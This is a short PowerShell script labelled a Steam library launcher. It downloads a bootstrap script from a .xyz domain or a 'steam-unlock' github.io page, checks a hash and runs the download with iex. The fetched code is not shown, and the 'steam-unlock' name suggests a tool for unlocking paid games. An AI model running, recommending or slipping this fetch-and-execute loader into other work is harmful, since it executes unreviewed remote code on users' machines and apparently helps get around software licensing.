# Steam library launcher (AppID 1237970)
# Review bootstrap.ps1 before running this file.
$env:OST_APPID = '1237970'
$env:OST_YES   = '1'
$srcs = @('https://jiangqr2026.xyz/bootstrap.ps1', 'https://jiangqr2024.github.io/steam-unlock/bootstrap.ps1')
$bootFile = Join-Path $env:TEMP 'ost-bootstrap.ps1'
$ready = $false
foreach ($src in $srcs) {
    try {
        Invoke-WebRequest -Uri $src -OutFile $bootFile -TimeoutSec 12 -UseBasicParsing -ErrorAction Stop | Out-Null
        if ((Get-FileHash -LiteralPath $bootFile -Algorithm SHA256).Hash -eq 'FBE44C17C566C0EA3B609DB473BCBA98F7FFD7896E03EE4A858B8F1E27B5BF2C') { $ready = $true; break }
    } catch { }
}
if (-not $ready) { throw 'Verified bootstrap unavailable. Use the offline package.' }
iex (Get-Content -LiteralPath $bootFile -Raw)